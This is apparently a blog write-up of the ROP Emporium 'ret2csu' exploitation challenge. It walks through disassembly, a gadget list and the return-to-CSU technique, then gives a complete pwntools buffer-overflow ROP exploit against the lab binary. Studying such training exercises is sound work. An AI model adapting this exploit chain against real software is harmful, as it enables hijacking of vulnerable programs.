---
layout:     post
title:      'ROP Emporium - ret2csu'
date:       2019-03-10 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

Last task from the ***Rop Emporium*** challenges and the last post. Today we're going to explore something called ***Universal Gadget***, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. 

Our goal in this challenge is to call `ret2win` function, but with value of `0xdeadcafebabebeef` in `rdx` register. Our main obstacle is the fact, that we do not have any gadgets allowing us, even in chain, to put value in this register. 

First of all, let's get the usual information about the binary. 

```text
[w3ndige@main ret2csu]$ rabin2 -I ret2csu 
arch     x86
baddr    0x400000
binsz    6783
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

With usual configution, let's jump into the disassembly. We can start of by viewing available functions used in binary.

```text
[w3ndige@main ret2csu]$ r2 -AAA ret2csu 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- This shell has been seized by the Internet's Police.
[0x004005f0]> afl
0x00400560    3 23           sym._init
0x00400590    1 6            sym.imp.puts
0x004005a0    1 6            sym.imp.system
0x004005b0    1 6            sym.imp.printf
0x004005c0    1 6            sym.imp.memset
0x004005d0    1 6            sym.imp.fgets
0x004005e0    1 6            sym.imp.setvbuf
0x004005f0    1 43           entry0
0x00400620    1 2            sym._dl_relocate_static_pie
0x00400630    4 42   -> 37   sym.deregister_tm_clones
0x00400660    4 58   -> 55   sym.register_tm_clones
0x004006a0    3 34   -> 29   sym.__do_global_dtors_aux
0x004006d0    1 7            entry.init0
0x004006d7    1 61           sym.main
0x00400714    1 157          sym.pwnme
0x004007b1    1 128          sym.ret2win
0x00400840    3 101  -> 92   sym.__libc_csu_init
0x004008b0    1 2            sym.__libc_csu_fini
0x004008b4    1 9            sym._fini
```

Here we have our usual functions that I'm already too familiar with. Quich check shows that both `main` and `pwnme` do not differ much from the previous challenges, while `ret2win` seems to have everything to view the flag.

```text
[0x004005f0]> pdf @sym.ret2win
/ (fcn) sym.ret2win 128
|   sym.ret2win (int arg1, int arg2, int arg3);
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_24h @ rbp-0x24
|           ; var int local_20h @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; var int local_10h @ rbp-0x10
|           ; var int local_8h @ rbp-0x8
|           ; arg int arg1 @ rdi
|           ; arg int arg2 @ rsi
|           ; arg int arg3 @ rdx
|           0x004007b1      55             push rbp
|           0x004007b2      4889e5         mov rbp, rsp
|           0x004007b5      4883ec30       sub rsp, 0x30               ; '0'
|           0x004007b9      897ddc         mov dword [local_24h], edi  ; arg1
|           0x004007bc      8975d8         mov dword [local_28h], esi  ; arg2
|           0x004007bf      488955d0       mov qword [local_30h], rdx  ; arg3
|           0x004007c3      488b055e0100.  mov rax, qword [0x00400928] ; [0x400928:8]=0xaacca9d1d4d7dcc0
|           0x004007ca      488b155f0100.  mov rdx, qword [0x00400930] ; [0x400930:8]=0xd5bed0dddfd28920
|           0x004007d1      488945e0       mov qword [local_20h], rax
|           0x004007d5      488955e8       mov qword [local_18h], rdx
|           0x004007d9      0fb705580100.  movzx eax, word [0x00400938] ; [0x400938:2]=170
|           0x004007e0      668945f0       mov word [local_10h], ax
|           0x004007e4      488d45e0       lea rax, [local_20h]
|           0x004007e8      488945f8       mov qword [local_8h], rax
|           0x004007ec      488b45f8       mov rax, qword [local_8h]
|           0x004007f0      488b00         mov rax, qword [rax]
|           0x004007f3      483345d0       xor rax, qword [local_30h]
|           0x004007f7      4889c2         mov rdx, rax
|           0x004007fa      488b45f8       mov rax, qword [local_8h]
|           0x004007fe      488910         mov qword [rax], rdx
|           0x00400801      488d45e0       lea rax, [local_20h]
|           0x00400805      4883c009       add rax, 9
|           0x00400809      488945f8       mov qword [local_8h], rax
|           0x0040080d      488b45f8       mov rax, qword [local_8h]
|           0x00400811      488b00         mov rax, qword [rax]
|           0x00400814      483345d0       xor rax, qword [local_30h]
|           0x00400818      4889c2         mov rdx, rax
|           0x0040081b      488b45f8       mov rax, qword [local_8h]
|           0x0040081f      488910         mov qword [rax], rdx
|           0x00400822      488d45e0       lea rax, [local_20h]
|           0x00400826      4889c7         mov rdi, rax
|           0x00400829      e872fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040082e      90             nop
|           0x0040082f      c9             leave
\           0x00400830      c3             ret
[0x004005f0]> 
```

Sooo, it seams to be quite easy to pwn, right? Not at all, let's take a look at the available gadgets. 

```text
[w3ndige@main ret2csu]$ ropper --file ret2csu 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040064e: adc byte ptr [rax], ah; jmp rax; 
0x0000000000400682: adc eax, 0xb8; add byte ptr [rax - 0x7b], cl; sal byte ptr [rbx + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040061f: add bl, dh; ret; 
0x00000000004007f2: add byte ptr [rax + 0x33], cl; ror byte ptr [r8 - 0x77], 1; ret 0x8b48; 
0x00000000004007a6: add byte ptr [rax - 0x39], cl; mov dword ptr [rax], 0x90000000; leave; ret; 
0x0000000000400645: add byte ptr [rax - 0x7b], cl; sal byte ptr [rbp + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x0000000000400687: add byte ptr [rax - 0x7b], cl; sal byte ptr [rbx + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040056a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004008ad: add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004007a4: add byte ptr [rax], al; add byte ptr [rax - 0x39], cl; mov dword ptr [rax], 0x90000000; leave; ret; 
0x0000000000400643: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rbp + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x0000000000400685: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rbx + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x00000000004008ab: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004007a2: add byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax - 0x39], cl; mov dword ptr [rax], 0x90000000; leave; ret; 
0x0000000000400704: add byte ptr [rax], al; add byte ptr [rax], al; call 0x714; mov eax, 0; pop rbp; ret; 
0x00000000004007a3: add byte ptr [rax], al; add byte ptr [rax], al; mov rdi, 0; nop; leave; ret; 
0x000000000040070e: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x00000000004007aa: add byte ptr [rax], al; add byte ptr [rax], al; nop; leave; ret; 
0x000000000040070a: add byte ptr [rax], al; add byte ptr [rax], bh; pop rbp; ret; 
0x0000000000400706: add byte ptr [rax], al; call 0x714; mov eax, 0; pop rbp; ret; 
0x000000000040070b: add byte ptr [rax], al; mov eax, 0; pop rbp; ret; 
0x00000000004007a5: add byte ptr [rax], al; mov rdi, 0; nop; leave; ret; 
0x0000000000400656: add byte ptr [rax], al; pop rbp; ret; 
0x00000000004008b2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x00000000004007ac: add byte ptr [rax], al; nop; leave; ret; 
0x000000000040070c: add byte ptr [rax], bh; pop rbp; ret; 
0x0000000000400655: add byte ptr [rax], r8b; pop rbp; ret; 
0x00000000004006b7: add byte ptr [rcx], al; pop rbp; ret; 
0x0000000000400573: add esp, 8; ret; 
0x0000000000400572: add rsp, 8; ret; 
0x00000000004006fe: call 0x590; mov eax, 0; call 0x714; mov eax, 0; pop rbp; ret; 
0x0000000000400829: call 0x5a0; nop; leave; ret; 
0x00000000004006ad: call 0x630; mov byte ptr [rip + 0x2009bf], 1; pop rbp; ret; 
0x0000000000400708: call 0x714; mov eax, 0; pop rbp; ret; 
0x0000000000400570: call rax; 
0x0000000000400570: call rax; add rsp, 8; ret; 
0x000000000040088c: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000400a73: jmp qword ptr [rbp]; 
0x0000000000400651: jmp rax; 
0x0000000000400823: lea eax, [rbp - 0x20]; mov rdi, rax; call 0x5a0; nop; leave; ret; 
0x0000000000400822: lea rax, [rbp - 0x20]; mov rdi, rax; call 0x5a0; nop; leave; ret; 
0x00000000004006b2: mov byte ptr [rip + 0x2009bf], 1; pop rbp; ret; 
0x00000000004007a1: mov dword ptr [rax], 0; mov rdi, 0; nop; leave; ret; 
0x00000000004007a9: mov dword ptr [rax], 0x90000000; leave; ret; 
0x0000000000400703: mov eax, 0; call 0x714; mov eax, 0; pop rbp; ret; 
0x000000000040070d: mov eax, 0; pop rbp; ret; 
0x00000000004006ab: mov ebp, esp; call 0x630; mov byte ptr [rip + 0x2009bf], 1; pop rbp; ret; 
0x00000000004007a8: mov edi, 0; nop; leave; ret; 
0x00000000004006b4: mov edi, 0x1002009; pop rbp; ret; 
0x000000000040064c: mov edi, 0x601058; jmp rax; 
0x0000000000400827: mov edi, eax; call 0x5a0; nop; leave; ret; 
0x00000000004007a0: mov qword ptr [rax], 0; mov rdi, 0; nop; leave; ret; 
0x00000000004006aa: mov rbp, rsp; call 0x630; mov byte ptr [rip + 0x2009bf], 1; pop rbp; ret; 
0x00000000004007a7: mov rdi, 0; nop; leave; ret; 
0x0000000000400826: mov rdi, rax; call 0x5a0; nop; leave; ret; 
0x0000000000400653: nop dword ptr [rax + rax]; pop rbp; ret; 
0x0000000000400695: nop dword ptr [rax]; pop rbp; ret; 
0x0000000000400568: or ah, byte ptr [rax]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004006b5: or dword ptr [rax], esp; add byte ptr [rcx], al; pop rbp; ret; 
0x000000000040068c: or ebx, dword ptr [rbp - 0x41]; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040089c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040089e: pop r13; pop r14; pop r15; ret; 
0x00000000004008a0: pop r14; pop r15; ret; 
0x00000000004008a2: pop r15; ret; 
0x000000000040064d: pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040064b: pop rbp; mov edi, 0x601058; jmp rax; 
0x000000000040089b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040089f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400658: pop rbp; ret; 
0x00000000004008a3: pop rdi; ret; 
0x00000000004008a1: pop rsi; pop r15; ret; 
0x000000000040089d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x00000000004006a9: push rbp; mov rbp, rsp; call 0x630; mov byte ptr [rip + 0x2009bf], 1; pop rbp; ret; 
0x00000000004007f9: ret 0x8b48; 
0x00000000004007f5: ror byte ptr [r8 - 0x77], 1; ret 0x8b48; 
0x00000000004007f6: ror byte ptr [rax - 0x77], 1; ret 0x8b48; 
0x0000000000400648: sal byte ptr [rbp + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040068a: sal byte ptr [rbx + rcx + 0x5d], 0xbf; pop rax; adc byte ptr [rax], ah; jmp rax; 
0x000000000040056d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004008b5: sub esp, 8; add rsp, 8; ret; 
0x00000000004008b4: sub rsp, 8; add rsp, 8; ret; 
0x00000000004007af: leave; ret; 
0x00000000004007ae: nop; leave; ret; 
0x0000000000400576: ret; 

84 gadgets found
```

As you can see here, there's nothing related to `rdx` here, so in theory we cannot set it and cannot bypass the restrictions. I've struggled at this moment for quite a while, but could not find a solution using these gadgets. 

But there is something more to the `ROP`, and this technique is called ***Return To CSU***. You can read more about it at [this](https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf) presentation, presented at BlackHat Asia. 

Basic idea is that we have a function called `__libc_csu_init`, which holds the gadgets to set three parameters just as we want. Let's disassemble it with `radare2`. 

```text
[0x004005f0]> pdf @sym.__libc_csu_init
/ (fcn) sym.__libc_csu_init 92
|   sym.__libc_csu_init (int arg1, int arg2, int arg3);
|           ; arg int arg1 @ rdi
|           ; arg int arg2 @ rsi
|           ; arg int arg3 @ rdx
|           ; DATA XREF from entry0 (0x400606)
|           0x00400840      4157           push r15
|           0x00400842      4156           push r14
|           0x00400844      4989d7         mov r15, rdx                ; arg3
|           0x00400847      4155           push r13
|           0x00400849      4154           push r12
|           0x0040084b      4c8d25be0520.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start ; 0x600e10
|           0x00400852      55             push rbp
|           0x00400853      488d2dbe0520.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end ; 0x600e18
|           0x0040085a      53             push rbx
|           0x0040085b      4189fd         mov r13d, edi               ; arg1
|           0x0040085e      4989f6         mov r14, rsi                ; arg2
|           0x00400861      4c29e5         sub rbp, r12
|           0x00400864      4883ec08       sub rsp, 8
|           0x00400868      48c1fd03       sar rbp, 3
|           0x0040086c      e8effcffff     call sym._init
|           0x00400871      4885ed         test rbp, rbp
|       ,=< 0x00400874      7420           je 0x400896
|       |   0x00400876      31db           xor ebx, ebx
|       |   0x00400878      0f1f84000000.  nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init (+0x54)
|      .--> 0x00400880      4c89fa         mov rdx, r15
|      :|   0x00400883      4c89f6         mov rsi, r14
|      :|   0x00400886      4489ef         mov edi, r13d
|      :|   0x00400889      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x0040088d                     add  rbx, 1
|      :|   0x00400891                     cmp  rbp, rbx
|      `==< 0x00400894                     jne  0x400880 ; sym.__libc_csu_init+0x40
|       |   ; CODE XREF from sym.__libc_csu_init (0x400874)
|       `-> 0x00400896      4883c408       add rsp, 8
|           0x0040089a      5b             pop rbx
|           0x0040089b      5d             pop rbp
|           0x0040089c      415c           pop r12
|           0x0040089e      415d           pop r13
|           0x004008a0      415e           pop r14
|           0x004008a2      415f           pop r15
\           0x004008a4      c3             ret
```

In here we can find two gadgets, first one would set the registers using `pop` and the second would put values in desired places. 

First gadget.

```text
|           0x0040089a      5b             pop rbx
|           0x0040089b      5d             pop rbp
|           0x0040089c      415c           pop r12
|           0x0040089e      415d           pop r13
|           0x004008a0      415e           pop r14
|           0x004008a2      415f           pop r15
\           0x004008a4      c3             ret
```

Second gadget. 

```text
|      .--> 0x00400880      4c89fa         mov rdx, r15
|      :|   0x00400883      4c89f6         mov rsi, r14
|      :|   0x00400886      4489ef         mov edi, r13d
|      :|   0x00400889      41ff14dc       call qword [r12 + rbx*8]
```

So if we put value `0xdeadcafebabebeef` in regiter `r15`, it would land in `rdx` register. Quite simple right? For our task it's just perfect, but we should think firstly of few restrictions that are presented with this solution. 

Firstly, second gadget is not terminated with `ret`, so we have to make sure that whatever is after it will work too. That is, `cmp` instruction. 

```text
|      :|   0x0040088d                     add  rbx, 1
|      :|   0x00400891                     cmp  rbp, rbx
|      `==< 0x00400894                     jne  0x400880 ; sym.__libc_csu_init+0x40
```

So our `rbx` should be set to `0` and `rbp` to `1` in order to get this sorted out. After that we should remember that `pop` instructions are used once again, but this time we can put some garbage in it. 

```text
|       `-> 0x00400896      4883c408       add rsp, 8
```

And because of that line, we have to add one more line of garbage used as some sort of padding. 

What now? In addition, we have `call qword` instruction that will call functions at address `r12 + rbx * 8`. As our `rbx` is 0, address is just `r12`. But what can we call? I've tried to directly call the `ret2win` function but always got the segfault. 

Reading a little bit more about this technique, I've found this [this](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html) blogpost showing us in practice how to correctly use it. 

In addition to our previous assumptions, we have to remember this.

> To effectively use mov rdx,r13 , we have to ensure that call QWORD PTR [r12+rbx*8] doesn't SIGSEGV, cmp rbx,rbp equals and most importantly value of RDX is not altered. 

Author of this post shows us that we can try to call the `__init()` function, localed using `DYNAMIC` variable. We can check that with `gdb` in our challenge. 

```text
gdb-peda$ x/5g &_DYNAMIC
0x600e20:	0x1	0x1
0x600e30:	0xc	0x400560
0x600e40:	0xd
```

As `__init` is used with `0x400560` address, our pointer would be `0x600e38`. After all of these steps, our register values should be correctly set, and we would normally place a address of `ret2win` on the stack. 

To sum up our steps:

* Call first gadget at address `0x0040089a`.
* Put the desired values at the stack.
* Register `R12` should be an pointer to `__init` address.
* Register `R15` shoud have value `0xdeadcafebabebeef`
* Register `RBX` should have value `0x00` while `RBP` `0x01`.
* Use second gadget at address `0x400880` that will put the values at correct registers.
* Keep in mind padding value that we have to place because of `add rsp, 8`.
* Put some `0x00`'s that will be popped into registers as the execution goes on.
* Place the address of `ret2win` function at the stack.

```python
from pwn import *

ret2win_adr         = 0x4007b1
first_gadget_adr    = 0x40089a
second_gadget_adr   = 0x400880
init_pointer        = 0x600e38

payload = b"A"  * 40
payload += p64(first_gadget_adr)
payload += p64(0x00)            # pop rbx
payload += p64(0x01)            # pop rbp
payload += p64(init_pointer)    # pop r12
payload += p64(0x00)            # pop r13
payload += p64(0x00)            # pop r14
payload += p64(0xdeadcafebabebeef) # pop r15
payload += p64(second_gadget_adr)
payload += p64(0x00)            # add rsp,0x8 padding
payload += p64(0x00)            # rbx
payload += p64(0x00)            # rbp
payload += p64(0x00)            # r12
payload += p64(0x00)            # r13
payload += p64(0x00)            # r14
payload += p64(0x00)            # r15
payload += p64(ret2win_adr)

ret2csu = process('./ret2csu')

# Uncomment for debugging
#pid = util.proc.pidof(ret2csu)[0]
#print("[*] PID = " + str(pid))
#util.proc.wait_for_debugger(pid)

ret2csu.readuntil('>')

ret2csu.sendline(payload)

output = ret2csu.readall()
print(output)
```

And proof of concept. 

```text
[w3ndige@main ret2csu]$ python exploit.py 
[+] Starting program './ret2csu': Done
[+] Recieving all data: Done (34B)
[*] Program './ret2csu' stopped with exit code -11
b' ROPE{a_placeholder_32byte_flag!}\n'
```